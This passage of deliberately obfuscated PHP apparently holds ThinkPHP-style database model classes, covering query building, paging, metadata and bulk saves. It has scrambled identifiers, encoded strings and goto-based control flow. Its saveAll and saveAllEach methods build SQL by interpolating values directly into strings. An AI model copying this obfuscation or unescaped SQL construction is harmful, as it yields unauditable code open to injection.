array_merge($bÃ‡«Ü, $this->_scope[$DÊ†Ú¯Şã]); } if (!empty($EŒ³¹’Àá±) && is_array($EŒ³¹’Àá±)) { $bÃ‡«Ü = array_merge($bÃ‡«Ü, $EŒ³¹’Àá±); } } elseif (is_array($cİ›¾„‚ˆï)) { $bÃ‡«Ü = $cİ›¾„‚ˆï; } if (is_array($bÃ‡«Ü) && !empty($bÃ‡«Ü)) { $this->options = array_merge($this->options, array_change_key_case($bÃ‡«Ü)); } return $this; } public function where($bÏ„ëĞ–âå, $bø¨ÅãÅï³ = null) { $a§ÕïéŞíß =& $_SERVER[¨¤¼…´]; if (!is_null($bø¨ÅãÅï³) && is_string($bÏ„ëĞ–âå)) { if (!is_array($bø¨ÅãÅï³)) { $bø¨ÅãÅï³ = func_get_args(); array_shift($bø¨ÅãÅï³); } $bø¨ÅãÅï³ = array_map(array($this->db, $a§ÕïéŞíß[344]), $bø¨ÅãÅï³); $bÏ„ëĞ–âå = vsprintf($bÏ„ëĞ–âå, $bø¨ÅãÅï³); } elseif (is_object($bÏ„ëĞ–âå)) { $bÏ„ëĞ–âå = get_object_vars($bÏ„ëĞ–âå); } elseif (is_array($bÏ„ëĞ–âå)) { foreach ($bÏ„ëĞ–âå as $C®µñ–é…Ÿ => $EéÇÕ®¸) { if ((is_numeric($C®µñ–é…Ÿ) || !$C®µñ–é…Ÿ) && is_string($EéÇÕ®¸)) { think_trace($a§ÕïéŞíß[351], $a§ÕïéŞíß[43], $a§ÕïéŞíß[56]); die; } } } if (is_string($bÏ„ëĞ–âå) && $a§ÕïéŞíß[43] != $bÏ„ëĞ–âå) { $Dôù°‡Õ±Ü = array(); $Dôù°‡Õ±Ü[$a§ÕïéŞíß[352]] = $bÏ„ëĞ–âå; $bÏ„ëĞ–âå = $Dôù°‡Õ±Ü; } if (isset($this->options[$a§ÕïéŞíß[276]])) { $this->options[$a§ÕïéŞíß[276]] = array_merge($this->options[$a§ÕïéŞíß[276]], $bÏ„ëĞ–âå); } else { $this->options[$a§ÕïéŞíß[276]] = $bÏ„ëĞ–âå; } return $this; } public function limit($DÕ££Àô²À, $D—ò“«Ñ½Ü = null) { $aµå‹¬ƒÊ =& $_SERVER[¨¤¼…´]; $this->options[$aµå‹¬ƒÊ[293]] = is_null($D—ò“«Ñ½Ü) ? $DÕ££Àô²À : $DÕ££Àô²À . $aµå‹¬ƒÊ[57] . $D—ò“«Ñ½Ü; return $this; } public function page($fÅ£º³¹¾, $BÔĞøÒáĞÏ = null) { $Bñô‚øèŒª =& $_SERVER[¨¤¼…´]; $this->options[$Bñô‚øèŒª[353]] = is_null($BÔĞøÒáĞÏ) ? $fÅ£º³¹¾ : $fÅ£º³¹¾ . $Bñô‚øèŒª[57] . $BÔĞøÒáĞÏ; return $this; } public function comment($Bí—Ó«‰ÌÁ) { $this->options[$_SERVER[¨¤¼…´][354]] = $Bí—Ó«‰ÌÁ; return $this; } public function setProperty($F»é¶‘—í, $eçÅ¤Ç•ö) { if (property_exists($this, $F»é¶‘—í)) { $this->{$F»é¶‘—í} = $eçÅ¤Ç•ö; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\x54\151\x6d\x65", "\164\151\155\x65", "\x69\x6e\163\x65\162\x74\x2c\x75\x70\x64\x61\164\x65", "\x66\165\x6e\143\x74\x69\x6f\156"), array("\x63\x72\145\141\164\x65\x54\x69\x6d\145", "\164\151\x6d\x65", "\151\156\163\x65\162\164", "\x66\x75\156\143\164\x69\x6f\156")); public function setDataAuto($c„µæÄ¬Äº) { $this->dataAuto = $c„µæÄ¬Äº; } public function __construct($CëÄ›ÕÍ = '', $BÊ«¬Ï»¨ = '', $dù¡ˆ‘±Ä = '') { parent::__construct($CëÄ›ÕÍ, $BÊ«¬Ï»¨, $dù¡ˆ‘±Ä); } public static function textEncode($A¹¢ÎÁò) { if (!$A¹¢ÎÁò) { return $A¹¢ÎÁò; } $dóÜØÕØ = json_encode($A¹¢ÎÁò); $dóÜØÕØ = preg_replace_callback($_SERVER[¨¤¼…´][355], function ($e¶„’À÷è) { return addslashes($e¶„’À÷è[0]); }, $dóÜØÕØ); return json_decode($dóÜØÕØ); } public static function textDecode($CÕÄ®¢ßİ) { $A²Š’ÓËÎ‚ =& $_SERVER[¨¤¼…´]; $F¸ø’ÙŞÇ = json_encode($CÕÄ®¢ßİ); $F¸ø’ÙŞÇ = preg_replace_callback($A²Š’ÓËÎ‚[356], function ($CÜŸÀÊ·‰Ò) { return $_SERVER[¨¤¼…´][103]; }, $F¸ø’ÙŞÇ); return json_decode($F¸ø’ÙŞÇ); } protected $tableMeta = array(); protected function _beforeInsert(&$bîˆÍ÷õìŞ, $D± ±®¹Â¤) { $FîšÏòà¡é =& $_SERVER[¨¤¼…´]; if (!$this->checkDataAutoHas($FîšÏòà¡é[357])) { return; } $this->dataBeforeFilter($bîˆÍ÷õìŞ, $FîšÏòà¡é[357]); } protected function _beforeUpdate(&$AôÆ‹ÓºÜé, $dƒ™øñìÆŸ) { $b«È’Ÿ˜ì =& $_SERVER[¨¤¼…´]; if (!$this->checkDataAutoHas($b«È’Ÿ˜ì[358])) { return; } $this->dataBeforeFilter($AôÆ‹ÓºÜé, $b«È’Ÿ˜ì[358]); } protected function _afterSelect(&$bê·š‹†Ø, $E’¸ƒÎïò”) { if (!is_array($bê·š‹†Ø)) { return; } if (!$this->checkDataAutoHas($_SERVER[¨¤¼…´][359])) { return; } foreach ($bê·š‹†Ø as &$A‰¼ÓŞ…Ş™) { $this->dataAfterFilter($A‰¼ÓŞ…Ş™); } unset($A‰¼ÓŞ…Ş™); } protected function _afterFind(&$aáÆâ›µÀŸ, $e×ƒôñé) { if (!is_array($aáÆâ›µÀŸ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¨¤¼…´][359])) { return; } $this->dataAfterFilter($aáÆâ›µÀŸ); } public function setAutoIncrement($cÙïŞ‹İê) { $Bß‰‰Æ¿é¬ = array($this->getPk() => $cÙïŞ‹İê); $Fß‰šï¢ƒÂ = $this->data($Bß‰‰Æ¿é¬)->add(); if ($Fß‰šï¢ƒÂ) { $this->delete($Fß‰šï¢ƒÂ); } } public function getAutoIncrement() { $e…â²Şß®Ó = $this->getTableName(); $BÌ­Ï¶ÈË = $this->max($this->getPk()); $C¦ÂğÂîÂ = $this->query("\x73\150\x6f\167\40\x74\141\142\x6c\145\x20\163\x74\x61\x74\165\x73\x20\167\150\x65\162\145\40\116\x61\x6d\145\75\x27{$e…â²Şß®Ó}\47"); $bêŠœÛ®ìš = $C¦ÂğÂîÂ[0][$_SERVER[¨¤¼…´][360]]; $C÷ÍÇŸ‘ï” = max($BÌ­Ï¶ÈË, $bêŠœÛ®ìš); return $C÷ÍÇŸ‘ï”; } protected function _callBefore($b·¬Ùß£, $C´‡× ¬Ş) { return $this->cacheCallCheck($b·¬Ùß£, $C´‡× ¬Ş, !1); } protected function _callAfter($Cñœ­—ŒÄ, $EÉî¦‹Ê) { return $this->cacheCallCheck($Cñœ­—ŒÄ, $EÉî¦‹Ê, !0); } protected function cacheFunctionAlias($e™â×Ç£Âö) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($FÅ¤ÁÉè³, $fà¤è‰¥®, $fò¸Åò‚µ¹ = false) { $a§ëƒµÜò« = $this->cacheFunctionAlias($fà¤è‰¥®); if (!$a§ëƒµÜò«) { return; } foreach ($a§ëƒµÜò« as $AÛ¾‡Ô…¨ç => $cîìÛóğé‰) { $Cà“ñç˜–‘ = $cîìÛóğé‰[0]; $aÙÇäÊŠÁæ = explode($_SERVER[¨¤¼…´][57], $cîìÛóğé‰[1]); if ($FÅ¤ÁÉè³ == $AÛ¾‡Ô…¨ç) { return $this->cacheFunctionGet($AÛ¾‡Ô…¨ç, $Cà“ñç˜–‘); } if ($fò¸Åò‚µ¹ && in_array($FÅ¤ÁÉè³, $aÙÇäÊŠÁæ)) { $this->cacheFunctionClear($AÛ¾‡Ô…¨ç, $Cà“ñç˜–‘); } } } public function cacheFunctionGet($f…”êº‘í‡, $E—Â‡ÓÑ¼) { $c—ä°¾÷šî = $this->cacheKeyMake($f…”êº‘í‡, $E—Â‡ÓÑ¼); $D§Ş‹±âØ× = Cache::get($c—ä°¾÷šî); if (!is_array($D§Ş‹±âØ×)) { $D§Ş‹±âØ× = call_user_func_array(array($this, $f…”êº‘í‡), array($E—Â‡ÓÑ¼, !0)); Cache::set($c—ä°¾÷šî, $D§Ş‹±âØ×); } return $D§Ş‹±âØ×; } public function cacheFunctionClear($F›ôŒ¡ğ®ƒ, $A¨»·“º…Ù) { $båÊğ§¹Ó« = $A¨»·“º…Ù; if (!is_array($A¨»·“º…Ù)) { $båÊğ§¹Ó« = array($A¨»·“º…Ù); } foreach ($båÊğ§¹Ó« as $CÈ†ãÚç§Ü) { $díÖäªÀÏ… = $this->cacheKeyMake($F›ôŒ¡ğ®ƒ, $CÈ†ãÚç§Ü); Cache::remove($díÖäªÀÏ…); } } private function cacheKeyMake($Eƒñ°òÀ×Ş, $fÒË»¨) { $A¼»Ğ®ññ =& $_SERVER[¨¤¼…´]; return get_class($this) . $A¼»Ğ®ññ[80] . $Eƒñ°òÀ×Ş . $A¼»Ğ®ññ[361] . $fÒË»¨; } protected function selectPage($Bø…¦¤÷šÖ = 200, $BáÖãÇôìè = 1) { goto Aä§›”¶â‰; FÃà‰«½¶: if ($B³­ïÂÁ == 1) { $eƒ˜¶¬å»¥ = count($CÖ‰ˆâÅ©Õ); } $Ağ¹¦ğ·éï = array($b„„å³Š¤[364] => array($b„„å³Š¤[365] => $eƒ˜¶¬å»¥, $b„„å³Š¤[362] => $Bø…¦¤÷šÖ, $b„„å³Š¤[353] => $BáÖãÇôìè, $b„„å³Š¤[366] => $B³­ïÂÁ), $b„„å³Š¤[367] => $CÖ‰ˆâÅ©Õ ? $CÖ‰ˆâÅ©Õ : array()); return $Ağ¹¦ğ·éï; goto AãíÑÓ¬ÕÇ; Aä§›”¶â‰: $b„„å³Š¤ =& $_SERVER[¨¤¼…´]; global $in; $e‡â‘ÖªÂ© = $this->optionsValue(); goto e²¼›…„Œ; f‰Ù»ŒƒÈä: $Bª°ßÒÙ = $e‡â‘ÖªÂ©; $Bª°ßÒÙ[$b„„å³Š¤[363]] = array(); $this->optionsValue($Bª°ßÒÙ); goto Eß‰—âãôí; e²¼›…„Œ: $cŠî·ëÜ”ø = 4000; $Bø…¦¤÷šÖ = isset($in[$b„„å³Š¤[362]]) ? $in[$b„„å³Š¤[362]] : $Bø…¦¤÷šÖ; if ($Bø…¦¤÷šÖ === -1) { unset($in[$b„„å³Š¤[362]]); $cŠî·ëÜ”ø = 100000000; $Bø…¦¤÷šÖ = $cŠî·ëÜ”ø; } goto f‰Ù»ŒƒÈä; dáÄŠ›¥ÚŸ: $B³­ïÂÁ = ceil($eƒ˜¶¬å»¥ / $Bø…¦¤÷šÖ); $BáÖãÇôìè = intval(isset($in[$b„„å³Š¤[353]]) ? $in[$b„„å³Š¤[353]] : $BáÖãÇôìè); $BáÖãÇôìè = $BáÖãÇôìè <= 1 ? 1 : ($BáÖãÇôìè >= $B³­ïÂÁ ? $B³­ïÂÁ : $BáÖãÇôìè); goto dÆàÄÁß; dÆàÄÁß: $this->optionsValue($e‡â‘ÖªÂ©); $CÖ‰ˆâÅ©Õ = $this->page($BáÖãÇôìè, $Bø…¦¤÷šÖ)->select(); $CÖ‰ˆâÅ©Õ = is_array($CÖ‰ˆâÅ©Õ) ? $CÖ‰ˆâÅ©Õ : array(); goto FÃà‰«½¶; Eß‰—âãôí: $eƒ˜¶¬å»¥ = intval($this->count()); $Bø…¦¤÷šÖ = intval($Bø…¦¤÷šÖ); $Bø…¦¤÷šÖ = $Bø…¦¤÷šÖ <= 5 ? 5 : ($Bø…¦¤÷šÖ >= $cŠî·ëÜ”ø ? $cŠî·ëÜ”ø : $Bø…¦¤÷šÖ); goto dáÄŠ›¥ÚŸ; AãíÑÓ¬ÕÇ: } protected function checkLength($B¡³¡Â…‹ô, $b‰˜¥âÇ–è = 0, $Dé†»Ö´êÔ = '') { $cÏ®ÌÈˆ³ =& $_SERVER[¨¤¼…´]; $b‰˜¥âÇ–è = $b‰˜¥âÇ–è ? $b‰˜¥âÇ–è : 65536; if (!$B¡³¡Â…‹ô || strlen($B¡³¡Â…‹ô) < $b‰˜¥âÇ–è) { return; } $Dé†»Ö´êÔ = $Dé†»Ö´êÔ ? $Dé†»Ö´êÔ . $cÏ®ÌÈˆ³[77] : $cÏ®ÌÈˆ³[43]; show_json($Dé†»Ö´êÔ . LNG($cÏ®ÌÈˆ³[368]) . "\x28{$b‰˜¥âÇ–è}\51", !1); } protected function metaSet($aÅ²ä­İù, $D¯Ù‰Ğß¯± = null, $f•®¦‚˜¡Õ = null) { goto Dù»¡ÉõÑµ; DáÙÔÃëÙ: if (is_null($D¯Ù‰Ğß¯±)) { return $f­£¢²ïİÜ->where(array($cĞæ’Â×ƒŒ => $aÅ²ä­İù))->delete(); } if (is_null($f•®¦‚˜¡Õ) && is_string($D¯Ù‰Ğß¯±)) { return $f­£¢²ïİÜ->where($D“åŠ§†ÛŠ)->delete(); } $C‘¯½Ï§ƒ = is_array($D¯Ù‰Ğß¯±) ? $D¯Ù‰Ğß¯± : array(); goto A÷³ƒ‘Ê©ï; A÷³ƒ‘Ê©ï: if (is_string($D¯Ù‰Ğß¯±)) { $C‘¯½Ï§ƒ[$D¯Ù‰Ğß¯±] = $f•®¦‚˜¡Õ; } $EÊ¤ğìªî¡ = array(); foreach ($C‘¯½Ï§ƒ as $B²Ï’’·´œ => $B¯«ß‰®÷â) { $this->checkLength($B¯«ß‰®÷â, !1, $e×™êçğ . $Aœ†™‘‘‚[4] . $B²Ï’’·´œ); $EÊ¤ğìªî¡[] = array($cĞæ’Â×ƒŒ => $aÅ²ä­İù, $Aœ†™‘‘‚[99] => $B²Ï’’·´œ, $Aœ†™‘‘‚[372] => $B¯«ß‰®÷â); } goto dÓÌÄ¿Š£; a‹¡¯œ•ç: $e×™êçğ = $this->tableMeta[$Aœ†™‘‘‚[370]]; $f­£¢²ïİÜ = Model($e×™êçğ); $D“åŠ§†ÛŠ = array($cĞæ’Â×ƒŒ => $aÅ²ä­İù, $Aœ†™‘‘‚[371] => $D¯Ù‰Ğß¯±); goto DáÙÔÃëÙ; Dù»¡ÉõÑµ: $Aœ†™‘‘‚ =& $_SERVER[¨¤¼…´]; if (!$this->tableMeta) { return !1; } $cĞæ’Â×ƒŒ = $this->tableMeta[$Aœ†™‘‘‚[369]]; goto a‹¡¯œ•ç; dÓÌÄ¿Š£: $f­£¢²ïİÜ->where(array($cĞæ’Â×ƒŒ => $aÅ²ä­İù))->addAll($EÊ¤ğìªî¡, array(), !0); return !0; goto D‘Û½«·†; D‘Û½«·†: } public function metaGet($bõ¶ãÊå•¢, $fŸ¨¤Û…ùŠ = false) { goto A– ‚ìÁ’İ; AŒôÛÒ®íÆ: $fŠ§—Û÷« = $c¿ÖºéõÊè->field($CÎÂºÔôµ‰[373])->where($aÒ’È”ôÔ)->select(); $fŠ§—Û÷« = array_to_keyvalue($fŠ§—Û÷«, $CÎÂºÔôµ‰[99], $CÎÂºÔôµ‰[372]); return $fŠ§—Û÷«; goto CÏÖŞˆ›ŠÈ; A– ‚ìÁ’İ: $CÎÂºÔôµ‰ =& $_SERVER[¨¤¼…´]; if (!$this->tableMeta) { return array(); } $fÃ½§ß¹ñô = $this->tableMeta[$CÎÂºÔôµ‰[369]]; goto Càº†©‡Ê; Càº†©‡Ê: $c¿ÖºéõÊè = Model($this->tableMeta[$CÎÂºÔôµ‰[370]]); if ($fŸ¨¤Û…ùŠ) { $aÒ’È”ôÔ = array($fÃ½§ß¹ñô => $bõ¶ãÊå•¢, $CÎÂºÔôµ‰[99] => $fŸ¨¤Û…ùŠ); return $c¿ÖºéõÊè->where($aÒ’È”ôÔ)->getField($CÎÂºÔôµ‰[372]); } $aÒ’È”ôÔ = array($fÃ½§ß¹ñô => $bõ¶ãÊå•¢); goto AŒôÛÒ®íÆ; CÏÖŞˆ›ŠÈ: } private function checkDataAutoHas($bğå£Í‘íé) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $dİ•ÀÇ‘Ã³) { if (in_array($bğå£Í‘íé, explode($_SERVER[¨¤¼…´][57], $dİ•ÀÇ‘Ã³[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$b­²áÇƒ, $cêÄÂ¥Ğ·) { $FÃœ‹‡ì› =& $_SERVER[¨¤¼…´]; foreach ($this->dataAuto as $cÁäºé¤©§) { $aƒÏÍ™»¨Ã = $cÁäºé¤©§[0]; if (!in_array($cêÄÂ¥Ğ·, explode($FÃœ‹‡ì›[57], $cÁäºé¤©§[2]))) { continue; } switch (trim($cÁäºé¤©§[3])) { case $FÃœ‹‡ì›[322]: case $FÃœ‹‡ì›[323]: $a¨­‹Ôï = $cÁäºé¤©§[1]; $aô²‹š¢¢ = isset($cÁäºé¤©§[4]) ? (array) $cÁäºé¤©§[4] : array(); if ($a¨­‹Ôï == $FÃœ‹‡ì›[204] && array_key_exists($aƒÏÍ™»¨Ã, $b­²áÇƒ)) { if (!$b­²áÇƒ[$aƒÏÍ™»¨Ã]) { unset($b­²áÇƒ[$aƒÏÍ™»¨Ã]); } break; } if (isset($b­²áÇƒ[$aƒÏÍ™»¨Ã])) { array_unshift($aô²‹š¢¢, $b­²áÇƒ[$aƒÏÍ™»¨Ã]); } if ($FÃœ‹‡ì›[322] == $cÁäºé¤©§[3]) { $b­²áÇƒ[$aƒÏÍ™»¨Ã] = call_user_func_array($a¨­‹Ôï, $aô²‹š¢¢); } else { $b­²áÇƒ[$aƒÏÍ™»¨Ã] = call_user_func_array(array(&$this, $a¨­‹Ôï), $aô²‹š¢¢); } break; case $FÃœ‹‡ì›[274]: $b­²áÇƒ[$aƒÏÍ™»¨Ã] = $b­²áÇƒ[$cÁäºé¤©§[1]]; break; case $FÃœ‹‡ì›[295]: if (isset($b­²áÇƒ[$aƒÏÍ™»¨Ã]) && !is_string($b­²áÇƒ[$aƒÏÍ™»¨Ã])) { $b­²áÇƒ[$aƒÏÍ™»¨Ã] = json_encode_force($b­²áÇƒ[$aƒÏÍ™»¨Ã]); } break; case $FÃœ‹‡ì›[324]: if ($b­²áÇƒ[$aƒÏÍ™»¨Ã] === $FÃœ‹‡ì›[43]) { unset($b­²áÇƒ[$aƒÏÍ™»¨Ã]); } break; case $FÃœ‹‡ì›[325]: $b­²áÇƒ[$aƒÏÍ™»¨Ã] = $cÁäºé¤©§[1]; default: break; } } if ($cêÄÂ¥Ğ· == $FÃœ‹‡ì›[357]) { $bº¨™Â„Ê× = strtolower($this->db->getDbType()); if (strpos($bº¨™Â„Ê×, $FÃœ‹‡ì›[19]) !== 0) { return; } $eÏ®áÆ¿²ó = $this->field(!0)->fields; $CáËÀôØ¨ = $eÏ®áÆ¿²ó[$FÃœ‹‡ì›[253]]; if (isset($eÏ®áÆ¿²ó[$FÃœ‹‡ì›[252]])) { unset($CáËÀôØ¨[$eÏ®áÆ¿²ó[$FÃœ‹‡ì›[252]]]); } foreach ($CáËÀôØ¨ as $aÆ¡ŒëŒù => $cêÄÂ¥Ğ·) { if (!isset($b­²áÇƒ[$aÆ¡ŒëŒù])) { $b­²áÇƒ[$aÆ¡ŒëŒù] = $FÃœ‹‡ì›[43]; } } } } private function dataAfterFilter(&$C„ãæ»°Òª) { $FÚ–³½–Áé =& $_SERVER[¨¤¼…´]; foreach ($this->dataAuto as $fÁ„ŸÄâ´è) { $fóƒõâ¬ ¾ = $fÁ„ŸÄâ´è[0]; if (!in_array($FÚ–³½–Áé[359], explode($FÚ–³½–Áé[57], $fÁ„ŸÄâ´è[2]))) { continue; } if (!isset($C„ãæ»°Òª[$fóƒõâ¬ ¾])) { continue; } switch (trim($fÁ„ŸÄâ´è[3])) { case $FÚ–³½–Áé[322]: case $FÚ–³½–Áé[323]: $DËˆÍ„ = isset($fÁ„ŸÄâ´è[4]) ? (array) $fÁ„ŸÄâ´è[4] : array(); array_unshift($DËˆÍ„, $C„ãæ»°Òª[$fóƒõâ¬ ¾]); if ($FÚ–³½–Áé[322] == $fÁ„ŸÄâ´è[3]) { $C„ãæ»°Òª[$fóƒõâ¬ ¾] = call_user_func_array($fÁ„ŸÄâ´è[1], $DËˆÍ„); } else { $C„ãæ»°Òª[$fóƒõâ¬ ¾] = call_user_func_array(array(&$this, $fÁ„ŸÄâ´è[1]), $DËˆÍ„); } break; case $FÚ–³½–Áé[274]: $C„ãæ»°Òª[$fóƒõâ¬ ¾] = $C„ãæ»°Òª[$fÁ„ŸÄâ´è[1]]; break; case $FÚ–³½–Áé[295]: $E‰Ş¶ÊËã° = $C„ãæ»°Òª[$fóƒõâ¬ ¾]; $C„ãæ»°Òª[$fóƒõâ¬ ¾] = json_decode($E‰Ş¶ÊËã°, !0); if (is_null($C„ãæ»°Òª[$fóƒõâ¬ ¾])) { $C„ãæ»°Òª[$fóƒõâ¬ ¾] = $E‰Ş¶ÊËã°; } break; case $FÚ–³½–Áé[324]: if ($C„ãæ»°Òª[$fóƒõâ¬ ¾] === $FÚ–³½–Áé[43]) { unset($C„ãæ»°Òª[$fóƒõâ¬ ¾]); } break; case $FÚ–³½–Áé[325]: $C„ãæ»°Òª[$fóƒõâ¬ ¾] = $fÁ„ŸÄâ´è[1]; default: break; } } } public function saveAll($dÆÎğĞÄ²) { goto bë”Í·†Şõ; EªŒÜÉø„ : $C¡ÀòÂäŠ° = array(); $B÷õÏìßÔ = count($dÆÎğĞÄ²); for ($cÅÑŸÎí¹ = 0; $cÅÑŸÎí¹ < $B÷õÏìßÔ; $cÅÑŸÎí¹++) { $BƒÙÔ¾ğÅ = $dÆÎğĞÄ²[$cÅÑŸÎí¹]; if (!is_array($BƒÙÔ¾ğÅ) || count($BƒÙÔ¾ğÅ) != 4) { continue; } $A›øÀ·Ã¼ = "\x55\x50\104\101\x54\x45\40\x60{$EÛÁõò«ŒÂ}\x60\x20\x53\x45\x54\x20{$BƒÙÔ¾ğÅ[2]}\40\x3d\40\103\x41\x53\x45\40{$BƒÙÔ¾ğÅ[0]}\x20\xa"; if ($C¬£ µëê == 0) { $EËõËÍáé = $A›øÀ·Ã¼; } $C¡ÀòÂäŠ°[] = $c³ÒïºÌÏĞ[123] . $BƒÙÔ¾ğÅ[1] . $c³ÒïºÌÏĞ[123]; $C¬£ µëê++; $EËõËÍáé .= "\40\127\x48\x45\x4e\40\47{$BƒÙÔ¾ğÅ[1]}\x27\x20\x54\110\105\116\x20\x27{$BƒÙÔ¾ğÅ[3]}\47\x20\xa"; if ($C¬£ µëê == $d †„ƒÇ¸ || $cÅÑŸÎí¹ == $B÷õÏìßÔ - 1) { goto C²Ñ¶·±‰ª; C²Ñ¶·±‰ª: $f“İÈªœ°À = implode($c³ÒïºÌÏĞ[57], $C¡ÀòÂäŠ°); $EËõËÍáé .= "\40\x45\x4e\x44\x20\40\x57\110\105\x52\x45\40{$BƒÙÔ¾ğÅ[0]}\40\x49\x4e\x20\x28{$f“İÈªœ°À}\x29\40"; $this->execute($EËõËÍáé); goto b¡Œ½ö£•; b¡Œ½ö£•: $C¬£ µëê = 0; $EËõËÍáé = $A›øÀ·Ã¼; $this->chunkEventCheck(count($C¡ÀòÂäŠ°)); goto FÇŸĞæŠÆß; FÇŸĞæŠÆß: $C¡ÀòÂäŠ° = array(); goto BØ¸ºÏ¼Ü¶; BØ¸ºÏ¼Ü¶: } } goto AÎ©İ‰Ú¯; bë”Í·†Şõ: $c³ÒïºÌÏĞ =& $_SERVER[¨¤¼…´]; $EÛÁõò«ŒÂ = $this->tablePrefix . $this->tableName; $d †„ƒÇ¸ = self::SQL_WHERE_IN_CHUNK; goto e¯ß‹ˆÊÇŸ; AÎ©İ‰Ú¯: $this->chunkEventSet(); goto c’ä©ÄØ‹; e¯ß‹ˆÊÇŸ: $dÆÎğĞÄ² = is_array($dÆÎğĞÄ²) ? $dÆÎğĞÄ² : array(); $EËõËÍáé = $c³ÒïºÌÏĞ[18]; $C¬£ µëê = 0; goto EªŒÜÉø„ ; c’ä©ÄØ‹: } public function saveAllEach($c¦³Å³ºÃ) { $eØÃÉ‡Ò‰‚ =& $_SERVER[¨¤¼…´]; $F“æÌ«ƒ¶š = $this->tablePrefix . $this->tableName; foreach ($c¦³Å³ºÃ as $eò§ÁŒ™ƒ«) { if (!is_array($eò§ÁŒ™ƒ«) || count($eò§ÁŒ™ƒ«) != 4) { continue; } $Fê¾­Ñ™ƒ = $eò§ÁŒ™ƒ«[0] . $eØÃÉ‡Ò‰‚[374] . $eò§ÁŒ™ƒ«[1] . $eØÃÉ‡Ò‰‚[123]; $B¡óœÅß÷á = $eò§ÁŒ™ƒ«[2] . $eØÃÉ‡Ò‰‚[374] . $eò§ÁŒ™ƒ«[3] . $eØÃÉ‡Ò‰‚[123]; $e…òŸÎ¬¾· = "\x75\160\144\x61\164\x65\x20{$F“æÌ«ƒ¶š}\x20\x73\x65\x74\40{$B¡óœÅß÷á}\40\167\x68\x65\x72\145\40{$Fê¾­Ñ™ƒ}\73"; $this->execute($e…òŸÎ¬¾·); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($FÑÊš«‘¹Ø = false, $FËĞ¦£ä­ = false) { $this->_chunkEvent = $FÑÊš«‘¹Ø; $this->_chunkEventParam = $FËĞ¦£ä­; } private function chunkEventCheck($cÚÙ‹ª£„Á) { if (!$this->_chunkEvent) { return; } $EÔ‹çÁŠ Ø = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $EÔ‹çÁŠ Ø[$_SERVER[¨¤¼…´][375]] = $cÚÙ‹ª£„Á; Hook::trigger($this->_chunkEvent, $EÔ‹çÁŠ Ø); } public function addAll($BŞùç¸‘ßË, $EÛ’Š¨‚Å± = array(), $f­¤ß‡Š’¹ = false) { goto Dˆ·œšÛî³; Dˆ·œšÛî³: $A›Ñ–á„¾ =& $_SERVER[¨¤¼…´]; ignore_timeout(); $e†Š‹¨„©¼ = self::SQL_WHERE_IN_CHUNK; goto e±±˜Á‚Àë; e±±˜Á‚Àë: if (empty($BŞùç¸‘ßË)) { $this->error = think_lang($A›Ñ–á„¾[272]); return !1; } $EÛ’Š¨‚Å± = $this->_parseOptions($EÛ’Š¨‚Å±); foreach ($BŞùç¸‘ßË as $b§šˆ”“â => $cÒ˜‡§é‡) { $BŞùç¸‘ßË[$b§šˆ”“â] = $this->_facade($cÒ˜‡§é‡); $this->_beforeInsert($BŞùç¸‘ßË[$b§šˆ”“â], $EÛ’Š¨‚Å±); } goto f«‘ †ÔÃµ; f«‘ †ÔÃµ: if (method_exists($this->db, $A›Ñ–á„¾[273])) { for ($FÖ‹„¶”âè = 0; $FÖ‹„¶”âè < count($BŞùç¸‘ßË); $FÖ‹„¶”âè += $e†Š‹¨„©¼) { $CôÛÏ¡ˆ¼œ = array_slice($BŞùç¸‘ßË, $FÖ‹„¶”âè, $e†Š‹¨„©¼); if (!is_array($CôÛÏ¡ˆ¼œ) || count($CôÛÏ¡ˆ¼œ) == 0) { break; } $bÃŒÓ¿Ç = $this->db->insertAll($CôÛÏ¡ˆ¼œ, $EÛ’Š¨‚Å±, $f­¤ß‡Š’¹); $this->chunkEventCheck(count($CôÛÏ¡ˆ¼œ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($BŞùç¸‘ßË as $b§šˆ”“â => $cÒ˜‡§é‡) { $bÃŒÓ¿Ç = $this->db->insert($cÒ˜‡§é‡, $EÛ’Š¨‚Å±, $f­¤ß‡Š’¹); } $this->commit(); } if (!1 !== $bÃŒÓ¿Ç) { $B‚×È©³—ª = $this->getLastInsID(); if ($B‚×È©³—ª) { return $B‚×È©³—ª; } } return $bÃŒÓ¿Ç; goto a‚ô´ÑÂ¡¹; a‚ô´ÑÂ¡¹: } public function save($DØÂÀ¿‰ß§ = '', $b”¡Ğ®ê“± = array()) { goto CÀ“¶ÂìÇñ; CÀ“¶ÂìÇñ: $c¬ğëÃ°•Ë =& $_SERVER[¨¤¼…´]; $FÑ……‚º = self::SQL_WHERE_IN_CHUNK; $F¶¿Ù¾¨°è = $this->optionsValue(); goto EÃ¾ëæîÓ; c“¦Áˆóß×: for ($fÓÌ¸ï¢Í = 0; $fÓÌ¸ï¢Í < $bÕÂ…ä»ö; $fÓÌ¸ï¢Í += $FÑ……‚º) { $bÔóÎå²»Ú = array_slice($Dö”†Ú‹, $fÓÌ¸ï¢Í, $FÑ……‚º); if (!is_array($bÔóÎå²»Ú) || count($bÔóÎå²»Ú) == 0) { break; } $F¶¿Ù¾¨°è[$c¬ğëÃ°•Ë[276]][$BŠ›“Ì’¶][1] = $bÔóÎå²»Ú; $this->optionsValue($F¶¿Ù¾¨°è); $fÜàÊ·À += parent::save($DØÂÀ¿‰ß§, $b”¡Ğ®ê“±); $this->chunkEventCheck(count($bÔóÎå²»Ú)); } $this->chunkEventSet(); return $fÜàÊ·À; goto B–„‹Øñ†Ç; EÃ¾ëæîÓ: $BŠ›“Ì’¶ = $this->findWhereField($F¶¿Ù¾¨°è); if (!$BŠ›“Ì’¶) { return parent::save($DØÂÀ¿‰ß§, $b”¡Ğ®ê“±); } $fÜàÊ·À = 0; goto Aˆ©ÄÓ‡¦Ä; Aˆ©ÄÓ‡¦Ä: $Dö”†Ú‹ = $F¶¿Ù¾¨°è[$c¬ğëÃ°•Ë[276]][$BŠ›“Ì’¶][1]; $Dö”†Ú‹ = is_array($Dö”†Ú‹) ? $Dö”†Ú‹ : array(); 